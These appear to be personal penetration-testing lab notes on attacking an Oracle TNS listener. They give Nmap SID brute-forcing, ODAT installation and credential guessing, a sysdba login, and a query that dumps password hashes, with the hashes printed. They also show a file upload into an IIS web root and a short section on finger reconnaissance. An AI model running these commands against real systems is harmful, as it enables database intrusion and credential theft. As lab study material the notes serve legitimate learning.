---
id: Enumeration
aliases: []
tags: []
---

# Enumeration

<!-- Nmap {{{-->
## Nmap

> [!todo]

```sh
sudo nmap -p1521 -sV 10.129.204.235 --open
```

> [!info]- Output
>
> ```sh
> Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
> Nmap scan report for 10.129.204.235
> Host is up (0.0041s latency).
>
> PORT     STATE SERVICE    VERSION
> 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
> ```

### SID Bruteforcing

> [!todo]

```sh
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

> [!info]- Output
>
> ```sh
> Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
> Nmap scan report for 10.129.204.235
> Host is up (0.0044s latency).
>
> PORT     STATE SERVICE    VERSION
> 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
> | oracle-sid-brute: 
> |_  XE
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
> ```
<!-- }}} -->

<!-- ODAT {{{-->
## ODAT

[ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
is designed to enumerate and exploit security flaws
(e.g., *SQL injection*, *remote code execution*, *privilege escalation*)
in Oracle databases

### Install

```sh
sudo apt install odat
```

#### Manual Setup

The following commands can be used to set up Oracle [odat](https://www.kali.org/tools/odat/)

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
> wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
> sudo mkdir -p /opt/oracle
> sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
> sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
> export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
> export PATH=$LD_LIBRARY_PATH:$PATH
> source ~/.bashrc
> cd ~
> git clone https://github.com/quentinhardy/odat.git
> cd odat/
> pip install python-libnmap
> git submodule init
> git submodule update
> pip3 install cx_Oracle
> sudo apt-get install python3-scapy -y
> sudo pip3 install colorlog termcolor passlib python-libnmap
> sudo apt-get install build-essential libgmp-dev -y
> pip3 install pycryptodome
>
> --2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
> Resolving download.oracle.com (download.oracle.com)... 23.58.104.121
> Connecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected.
> HTTP request sent, awaiting response... 200 OK
> Length: 79386308 (76M) [application/zip]
> Saving to: ‘instantclient-basic-linux.x64-21.4.0.0.0dbru.zip’
>
> <SNIP>
> ```
<!-- }}} -->

### Usage

> [!todo]


```sh
./odat.py all -s 10.129.204.235
```

```sh
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

<!-- }}} -->

## SQLplus

> [!todo]

### Log In

> [!todo]

```sh
sqlplus scott/tiger@10.129.204.235/XE
```

<!-- Output {{{-->
> [!output]-
>
>```sh
>SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
>Version 21.4.0.0.0
>
>Copyright (c) 1982, 2021, Oracle. All rights reserved.
>
>ERROR:
>ORA-28002: the password will expire within 7 days
>
>
>
>Connected to:
>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
>
>SQL>
>```
<!-- }}} -->

> [!tip]
>
> In case of this error
>
> ```sh
> sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
> ```
>
> Execute the following, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared)
>
> ```sh
> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
> ```

### Oracle RDBMS

Once [[Enumeration#Log In|logged in]],
[Oracle RDBMS](https://www.oracle.com/database/what-is-a-relational-database/)
can be explored

#### Interaction

> [!todo]

```sql
select table_name from all_tables;
```

<!-- Output {{{-->
> [!info]- Output
>
> ```
> TABLE_NAME
> ------------------------------
> DUAL
> SYSTEM_PRIVILEGE_MAP
> TABLE_PRIVILEGE_MAP
> STMT_AUDIT_OPTION_MAP
> AUDIT_ACTIONS
> WRR$_REPLAY_CALL_FILTER
> HS_BULKLOAD_VIEW_OBJ
> HS$_PARALLEL_METADATA
> HS_PARTITION_COL_NAME
> HS_PARTITION_COL_TYPE
> HELP
>
> ...SNIP...
>
>
> SQL> select * from user_role_privs;
>
> USERNAME                       GRANTED_ROLE                   ADM DEF OS_
> ------------------------------ ------------------------------ --- --- ---
> SCOTT                          CONNECT                        NO  YES NO
> SCOTT                          RESOURCE                       NO  YES NO
> ```
<!-- }}} -->

#### Database Enumeration

```sh
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

<!-- Output {{{-->
> [!info]- Output
>
> ```sh
> SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
> Version 21.4.0.0.0
>
> Copyright (c) 1982, 2021, Oracle. All rights reserved.
>
>
> Connected to:
> Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
>
>
> SQL> select * from user_role_privs;
>
> USERNAME                       GRANTED_ROLE                   ADM DEF OS_
> ------------------------------ ------------------------------ --- --- ---
> SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
> SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
> SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
> SYS                            AQ_USER_ROLE                   YES YES NO
> SYS                            AUTHENTICATEDUSER              YES YES NO
> SYS                            CONNECT                        YES YES NO
> SYS                            CTXAPP                         YES YES NO
> SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
> SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
> SYS                            DBA                            YES YES NO
> SYS                            DBFS_ROLE                      YES YES NO
>
> USERNAME                       GRANTED_ROLE                   ADM DEF OS_
> ------------------------------ ------------------------------ --- --- ---
> SYS                            DELETE_CATALOG_ROLE            YES YES NO
> SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
> ...SNIP...
> ```
<!-- }}} -->

#### Extract Password Hashes

```sql
select name, password from sys.user$;
```

<!-- Output {{{-->
> [!info]- Output
>
> ```sh
> NAME                           PASSWORD
> ------------------------------ ------------------------------
> SYS                            FBA343E7D6C8BC9D
> PUBLIC
> CONNECT
> RESOURCE
> DBA
> SYSTEM                         B5073FE1DE351687
> SELECT_CATALOG_ROLE
> EXECUTE_CATALOG_ROLE
> DELETE_CATALOG_ROLE
> OUTLN                          4A3BA55E08595C81
> EXP_FULL_DATABASE
> 
> NAME                           PASSWORD
> ------------------------------ ------------------------------
> IMP_FULL_DATABASE
> LOGSTDBY_ADMINISTRATOR
> ...SNIP...
> ```
<!-- }}} -->

#### File Upload

```sh
echo "Oracle File Upload Test" > testing.txt
```
```sh
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

<!-- Output {{{-->
> [!info]- Output
>
> ```sh
> [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
> [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
> ```
<!-- }}} -->

<!-- Finger {{{-->
## Finger

If the [finger service](https://en.wikipedia.org/wiki/Finger_(protocol))
is active on the same host as the [[General#TNS Listener|TNS listener]],
and the Oracle OS account (often just `oracle`) is known, the **finger** output
can leak:

- The exact home directory (e.g., `/home/oracle`, `/u01/app/oracle`, etc.)
- The shell and sometimes system info
- Possibly hints about the Oracle software path or environment variables

This is valuable reconnaissance material:

- The home directory path often matches Oracle installation paths
- Knowing where Oracle is installed helps craft local privilege escalation,
  file system attacks, or configuration abuse
- Combined with other leaks (e.g.,
  [[General#Default Password|default listener password]] or unprotected
  `listener.ora`), an attacker could manipulate the TNS listener
  [[General#TNS Listener|TNS listener]] or connect directly to the database

> [!todo]

<!-- }}} -->
